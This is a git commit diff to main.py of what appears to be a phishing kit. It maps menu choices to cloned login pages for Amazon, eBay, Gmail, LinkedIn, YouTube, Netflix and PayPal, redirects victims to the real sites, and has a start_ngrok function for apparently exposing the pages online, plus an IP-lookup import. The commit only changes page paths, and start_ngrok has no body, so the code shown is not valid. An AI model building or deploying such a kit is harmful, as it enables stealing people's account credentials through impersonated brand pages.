9fe0c7d47ee2b3bb2ad00cf365a56a8056f8079a
RykerWilder <fabiomasciarelliwd@gmail.com>
2025-05-29 09:00:00 +0200

    fix: sites in main.py

--- main.py
+++ main.py
@@ -1,17 +1,17 @@
 from utils import print_welcome_message, get_ip_info
 
 sites = {
-    "1": {"name": "Amazon", "html": "amazon.html", "redirect": "https://amazon.com"},
-    "2": {"name": "Ebay", "html": "ebay.html", "redirect": "https://ebay.com"},
-    "3": {"name": "Gmail", "html": "gmail.html", "redirect": "https://mail.google.com"},
-    "4": {"name": "LinkedIn", "html": "linkedin.html", "redirect": "https://linkedin.com"},
-    "5": {"name": "YouTube", "html": "youtube.html", "redirect": "https://youtube.com"},
-    "6": {"name": "Netflix", "html": "netflix.html", "redirect": "https://netflix.com"},
-    "7": {"name": "PayPal", "html": "paypal.html", "redirect": "https://paypal.com"},
+    "1": {"name": "Amazon", "html": "amazon/amazon.html", "redirect": "https://amazon.com"},
+    "2": {"name": "Ebay", "html": "ebay/ebay.html", "redirect": "https://ebay.com"},
+    "3": {"name": "Gmail", "html": "gmail/gmail.html", "redirect": "https://mail.google.com"},
+    "4": {"name": "LinkedIn", "html": "linkedin/linkedin.html", "redirect": "https://linkedin.com"},
+    "5": {"name": "YouTube", "html": "youtube/youtube.html", "redirect": "https://youtube.com"},
+    "6": {"name": "Netflix", "html": "netflix/netflix.html", "redirect": "https://netflix.com"},
+    "7": {"name": "PayPal", "html": "paypal/paypal.html", "redirect": "https://paypal.com"},
 }
 
 def start_ngrok():
-    
+
 
 def main():
     print_welcome_message()
